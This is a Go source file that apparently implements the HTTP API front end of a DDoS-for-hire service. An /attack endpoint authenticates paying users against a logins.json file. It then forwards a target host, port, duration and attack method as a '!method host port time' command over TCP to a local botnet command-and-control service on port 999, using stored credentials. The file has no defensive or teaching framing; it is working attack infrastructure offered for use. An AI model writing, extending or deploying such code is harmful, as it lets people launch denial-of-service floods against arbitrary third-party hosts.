package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

type User struct {
	User      string `json:"user"`
	Pass      string `json:"pass"`
	ApiAccess bool   `json:"apiAccess"`
	ApiKey    string `json:"apiKey"`
}

type UserCache struct {
	users      []User
	lastUpdate time.Time
	mu         sync.RWMutex
	cacheTTL   time.Duration
}

var userCache = &UserCache{
	cacheTTL: 60 * time.Second,
}

func main() {
	userCache.Refresh()

	mux := http.NewServeMux()

	mux.HandleFunc("/attack", func(w http.ResponseWriter, r *http.Request) {
		AttackHandler(w, r)
	})

	fmt.Println("Server started on :9999")
	log.Fatal(http.ListenAndServe(":9999", mux))
}

func AttackHandler(w http.ResponseWriter, r *http.Request) {
	clientIP := getClientIP(r)

	query := r.URL.Query()

	user := query.Get("user")
	apiKey := query.Get("apikey")
	host := query.Get("host")
	port := query.Get("port")
	duration := query.Get("time")
	methodName := query.Get("method")

	fmt.Printf("[%s] Request from IP: %s | User: %s | API Key: %s\n",
		time.Now().Format("2006-01-02 15:04:05"), clientIP, user, maskAPIKey(apiKey))

	if user == "" || apiKey == "" || host == "" || port == "" || duration == "" || methodName == "" {
		fmt.Printf("[%s] Missing parameters from IP: %s\n",
			time.Now().Format("2006-01-02 15:04:05"), clientIP)
		http.Error(w, "Missing required parameters: user, apikey, host, port, time, method", http.StatusBadRequest)
		return
	}

	if !CheckAPIKey(user, apiKey) {
		fmt.Printf("[%s] Authentication failed - IP: %s | User: %s | API Key: %s\n",
			time.Now().Format("2006-01-02 15:04:05"), clientIP, user, maskAPIKey(apiKey))
		http.Error(w, "Invalid API key or no API access", http.StatusUnauthorized)
		return
	}

	fmt.Printf("[%s] Authentication success - IP: %s | User: %s\n",
		time.Now().Format("2006-01-02 15:04:05"), clientIP, user)

	fmt.Printf("[%s] Attack started - IP: %s | User: %s | Target: %s:%s | Duration: %ss | Method: %s\n",
		time.Now().Format("2006-01-02 15:04:05"), clientIP, user, host, port, duration, methodName)

	command := fmt.Sprintf("!%s %s %s %s", methodName, host, port, duration)

	go func() {
		if err := RunCommand(command, GetPass("api")); err != nil {
			fmt.Printf("[%s] Command execution failed - IP: %s | User: %s | Error: %v\n",
				time.Now().Format("2006-01-02 15:04:05"), clientIP, user, err)
			log.Printf("Failed to run command: %v", err)
		} else {
			fmt.Printf("[%s] Command sent successfully - IP: %s | User: %s\n",
				time.Now().Format("2006-01-02 15:04:05"), clientIP, user)
		}
	}()

	w.Header().Set("Content-Type", "application/json")
	resp := map[string]string{
		"status":  "ok",
		"message": "Attack started successfully",
		"user":    user,
		"host":    host,
		"port":    port,
		"time":    duration,
		"method":  methodName,
	}
	_ = json.NewEncoder(w).Encode(resp)
}

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		return forwarded
	}

	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}

	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}

func maskAPIKey(apiKey string) string {
	if len(apiKey) <= 4 {
		return "****"
	}
	return apiKey[:4] + "****" + apiKey[len(apiKey)-4:]
}

func CheckAPIKey(user, apiKey string) bool {
	users := userCache.GetUsers()
	for _, u := range users {
		if u.User == user && u.ApiKey == apiKey && u.ApiAccess {
			return true
		}
	}
	return false
}

func GetPass(user string) string {
	users := userCache.GetUsers()
	for _, u := range users {
		if u.User == user {
			return u.Pass
		}
	}
	return ""
}

func (uc *UserCache) GetUsers() []User {
	uc.mu.RLock()

	if time.Since(uc.lastUpdate) > uc.cacheTTL {
		uc.mu.RUnlock()
		uc.Refresh()
		uc.mu.RLock()
	}

	users := uc.users
	uc.mu.RUnlock()
	return users
}

func (uc *UserCache) Refresh() {
	uc.mu.Lock()
	defer uc.mu.Unlock()

	file, err := os.ReadFile("database/logins.json")
	if err != nil {
		log.Printf("Failed to read database/logins.json: %v\n", err)
		return
	}

	var users []User
	if err := json.Unmarshal(file, &users); err != nil {
		log.Printf("Failed to parse database/logins.json: %v\n", err)
		return
	}

	uc.users = users
	uc.lastUpdate = time.Now()
	fmt.Printf("[%s] User database refreshed - Total users: %d\n",
		time.Now().Format("2006-01-02 15:04:05"), len(users))
}

func RunCommand(command, password string) error {
	conn, err := net.DialTimeout("tcp", ":999", 5*time.Second)
	if err != nil {
		return fmt.Errorf("failed to connect: %w", err)
	}
	defer conn.Close()

	deadline := time.Now().Add(10 * time.Second)
	conn.SetDeadline(deadline)

	commands := []string{"api", password, command}
	for _, cmd := range commands {
		if _, err := fmt.Fprintf(conn, "%s\r\n", cmd); err != nil {
			return fmt.Errorf("failed to send command '%s': %w", cmd, err)
		}
		time.Sleep(100 * time.Millisecond)
	}

	return nil
}
